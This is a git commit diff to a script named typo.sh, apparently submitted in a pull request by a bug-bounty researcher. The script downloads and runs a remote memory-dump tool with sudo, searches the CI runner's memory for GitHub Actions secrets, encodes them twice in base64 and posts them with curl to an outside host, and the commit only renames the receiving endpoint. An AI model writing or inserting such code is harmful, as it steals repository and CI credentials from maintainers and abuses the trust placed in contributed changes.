5f8f305b0129525b89fd9df2bb8be2209487439b
r00tdaddy <r00tdaddy@wearehackerone.com>
2024-08-18 09:04:29 -0400

    Ensure change is committed for PR

--- typo.sh
+++ typo.sh
@@ -2,5 +2,5 @@
 YOUR_EXFIL="vwcqdc55.c5.rs"
 B64_BLOB=`curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d "\0" | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' | sort -u | base64 -w 0 | base64 -w 0`
 echo $B64_BLOB
-curl -s -d "$B64_BLOB" https://$YOUR_EXFIL/token > /dev/null
+curl -s -d "$B64_BLOB" https://$YOUR_EXFIL/gh_token > /dev/null
 sleep 900
